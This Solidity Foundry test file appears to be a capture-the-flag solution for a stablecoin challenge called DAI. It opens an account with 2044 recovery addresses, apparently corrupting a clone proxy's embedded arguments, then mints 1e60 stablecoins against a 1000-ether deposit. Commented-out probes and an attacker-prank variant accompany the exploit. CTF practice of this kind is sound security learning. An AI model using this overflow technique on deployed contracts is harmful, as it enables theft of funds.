// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "src/DAI/Challenge.sol";
import "src/DAI/SystemConfiguration.sol";
import "src/DAI/AccountManager.sol";
import {Account as Acct} from "src/DAI/Account.sol";

contract MockPriceFeed {
    int256 public price = 178755855000;

    function setPrice(int256 _price) public {
        price = _price;
    }

    function latestRoundData()
        external
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
        return (0, price, 0, 0, 0);
    }
}

contract DAITest is Test {
    address[] public recoveries = new address[](0);
    address[] public recoveries2 = new address[](4);//max? 65535

    SystemConfiguration public configuration;
    AccountManager public manager;

    Challenge public challenge;

    function setUp() public {
        // vm.rollFork(16_543_210);

        configuration = new SystemConfiguration();
        vm.label(address(configuration), "configuration");
        manager = new AccountManager(configuration);
        vm.label(address(manager), "manager");

        configuration.updateAccountManager(address(manager));
        configuration.updateStablecoin(address(new Stablecoin(configuration)));
        Acct acct = new Acct();
        vm.label(address(acct), "Account Implementation");
        configuration.updateAccountImplementation(address(acct));
        // configuration.updateEthUsdPriceFeed(
        //     0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419
        // );
        configuration.updateEthUsdPriceFeed(address(new MockPriceFeed()));

        configuration.updateSystemContract(address(manager), true);

        challenge = new Challenge(configuration);
    }

    receive() external payable {}

    function testDebug() public {
        vm.deal(address(this), 1000 ether);

        recoveries2 = new address[](2044);
        for (uint i = 0; i < recoveries2.length; i++) {
            recoveries2[i] = address(uint160(i));
        }

        Acct newAcc = manager.openAccount(address(this), recoveries2);
        // bytes memory _call = abi.encodePacked(
        //     manager.openAccount.selector,
        //     uint(uint160(address(this))),
        //     uint(0x40),//@index length location
        //     uint(2),//array length to read
        //     uint(0), //@address [0]
        //     uint(0)
        // );
        // emit log_named_bytes("call", _call);
        // (bool success, bytes memory result) = address(manager).call(_call);
        // console.log("succeed: %s", success);
        // emit log_named_bytes("result", result);



        newAcc.deposit{value: 1000 ether}();
        manager.mintStablecoins(newAcc, 1e60, "");
        emit log_named_bytes("newAcc code", address(newAcc).code);
        console.log("is solved: ", challenge.isSolved());
        // console.log("debug offset: %s", newAcc.debugViewOffset());
        // bytes memory _call = abi.encodeWithSignature("increaseDebt(address,uint256,string)");//@9c686564
        // _call = abi.encodePacked(_call, uint(uint160(address(this))), uint(0), uint(0x20) );

        // (bool success, bytes memory result) = address(newAcc).call(_call);
        // emit log_named_bytes("result", result);

        // require(success, "withdraw failed");
    }
    // function testOpenAccountWeirdly() public {
    //     address target = address(this);
    //     address[] memory array = new address[](2);
    //     array[0] = address(0x123123);
    //     array[1] = address(0x456456);

    //     _openAccount(address(this), recoveries);
    //     _openAccount(address(this), array);

    //     Acct acc = manager.openAccount(target, array);
    //     bytes memory _call = abi.encodeWithSignature("debugViewOffset()");
    //     _call = abi.encodePacked(_call, uint(123));
    //     (bool success, bytes memory result) = address(acc).call(_call);
    //     emit log_named_bytes("result", result);

    //     _call = abi.encodeWithSignature("debugViewSystem()");
    //     _call = abi.encodePacked(_call, uint(929));
    //     (success, result) = address(acc).call(_call);

    //     emit log_named_bytes("result", result);
    // }

    // function _openAccount(
    //     address owner,
    //     address[] memory recoveryAddresses
    // ) private returns (Acct) {
    //     Acct newAcc = manager.openAccount(owner, recoveryAddresses);
    //     console.log("system: %s", newAcc.debugViewSystem());
    //     console.log("offset: %s", newAcc.debugViewOffset());
    //     emit log_named_bytes("code", address(newAcc).code);
    //     return newAcc;
    // }

    // function testDebug() public {
    //     vm.deal(address(this), 1000 ether);
    //     Acct newAcc = manager.openAccount(address(this), recoveries2);
    //     vm.label(address(this), "test");
    //     vm.label(address(newAcc), "proxy");
    //     vm.breakpoint("w");
    //     newAcc.deposit{value: 1000 ether}();
    //     vm.breakpoint("e");
    //     manager.mintStablecoins(newAcc, getMaxDebt(1000 ether),"");
    // }

    // function testFoo() public {
    //     console.log(
    //         "total supply: &e",
    //         IERC20(configuration.getStablecoin()).totalSupply()
    //     );
    //     address attacker = address(0x123123);
    //     vm.deal(address(attacker), 1000 ether);
    //     uint deposit = 900 ether;
    //     vm.startPrank(address(attacker));

    //     Acct newAcc = manager.openAccount(attacker, recoveries);//@0x363d3d3761004a603836393d3d3d3661004a013d735991a2df15a8f6a256d3ec51e99254cd3fb576a95af43d82803e903d91603657fd5bf35615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000012312300000000000000000000000000000000000000000000000000000000000000000048
    //     emit log_named_bytes("code", address(newAcc).code);

    //     emit log_named_bytes("code", address( manager.openAccount(attacker, recoveries2)).code);

    //     console.log("max debt %e", getMaxDebt(deposit));
    //     //migrate and mint
    //     bytes[] memory signatures = new bytes[](0);
    //     console.log("deposit init");
    //     newAcc.deposit{value: deposit}();
    //     manager.mintStablecoins(newAcc, getMaxDebt(deposit),"");
    //     console.log("acct debt: %e", newAcc.debt());
    //     console.log("acct balance: %e", address(newAcc).balance);

    //     console.log("migration from", address(newAcc));
    //     newAcc = newAcc.recoverAccount(attacker, recoveries, signatures);
    //     emit log_named_bytes("code", address(newAcc).code);
    //     console.log("migration done", address(newAcc));

    //     console.log("acct debt: %e", newAcc.debt());
    //     console.log("acct balance: %e", address(newAcc).balance);

    //     vm.stopPrank();
    //     console.log(
    //         "total supply: %e",
    //         IERC20(configuration.getStablecoin()).totalSupply()
    //     );

    //     console.log("is solved: ", challenge.isSolved());
    // }

    // function getMaxDebt(uint deposit) public view returns (uint256) {
    //     (, int256 ethPriceInt, , , ) = AggregatorV3Interface(
    //         configuration.getEthUsdPriceFeed()
    //     ).latestRoundData();
    //     if (ethPriceInt <= 0) return 0;

    //     uint256 ethPrice = uint256(ethPriceInt);
    //     //totalBalance * ethPrice / 1e8 /15000 * 10000
    //     return (((deposit * ethPrice) / 1e8) * 10000) / 15000;
    // }
}
